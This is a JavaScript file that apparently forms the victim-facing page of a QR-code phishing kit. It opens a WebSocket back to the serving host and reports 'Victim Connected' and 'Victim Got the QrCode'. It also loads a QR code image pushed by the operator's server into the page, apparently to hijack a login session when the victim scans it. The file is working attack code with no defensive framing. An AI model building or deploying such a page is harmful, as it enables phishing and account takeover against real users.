if (typeof window !== "undefined") {
  document.addEventListener("DOMContentLoaded", function () {
    const img = document.querySelector("#qr-code");
    const ws = new WebSocket("ws://" + window.location.host.toString());
    function pong(value) {
      if (ws.readyState == ws.OPEN) {
        ws.send(JSON.stringify(value));
      }
    }
    ws.onopen = () => {
      pong({ status: "[Status] - Victim Connected" });
    };
    ws.onmessage = function (event) {
      let message = JSON.parse(event.data);
      if (message.src) {
        if (img) {
          pong({ status: "[Status] - Victim Got the QrCode" });
          img.src = message.src;
          //img.src = "http://localhost:8000/"+message.src;
        }
      } else if (message.exit) {
        pong({ status: "[Status] - Work Completed" });
        ws.close(1000, "Work Complete");
      }
    };
    ws.onerror = function (error) {
      pong({ error: error });
    };
  });
}
